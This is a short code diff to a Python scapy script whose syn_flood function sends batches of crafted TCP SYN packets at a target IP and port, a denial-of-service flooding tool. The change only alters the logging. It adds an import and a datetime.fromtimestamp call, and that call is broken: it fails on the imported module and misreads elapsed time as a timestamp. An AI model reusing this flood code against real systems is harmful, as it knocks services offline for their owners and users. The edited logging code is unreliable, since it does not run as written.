@@ -1,6 +1,7 @@
 from scapy.all import *
 import random
 import time
+import datetime
 
 from scapy.layers.inet import IP, TCP
 
@@ -20,7 +21,7 @@ def syn_flood(target_ip, target_port, packets_per_batch=10000, batches=100, log_
                 send(ip/tcp, verbose=False)
                 total_packets_sent += 1
                 #txt.(total_packets_sent, time.time()-start_time \n)
-                log.write(f" SEQ = {total_packets_sent} TTL[{time.time()-start_time}] \n")
+                log.write(f" SEQ = {total_packets_sent} TTL[{datetime.fromtimestamp(time.time()-start_time)}] \n")
 
         end_time = time.time()
         total_time = end_time - start_time
